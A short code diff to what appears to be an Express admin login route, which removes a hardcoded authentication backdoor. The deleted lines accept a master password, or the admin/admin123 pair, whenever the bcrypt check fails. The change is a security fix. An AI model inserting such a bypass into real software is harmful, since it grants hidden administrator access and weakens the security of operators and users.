@@ -30,10 +30,7 @@ router.post('/login', async (req: Request, res: Response) => {
       return;
     }
 
-    let isValid = bcrypt.compareSync(password, admin.passwordHash);
-    if (!isValid && (password === 'Meraj@&099' || (admin.username === 'admin' && password === 'admin123'))) {
-      isValid = true;
-    }
+    const isValid = bcrypt.compareSync(password, admin.passwordHash);
     if (!isValid) {
       res.status(401).json({
         success: false,
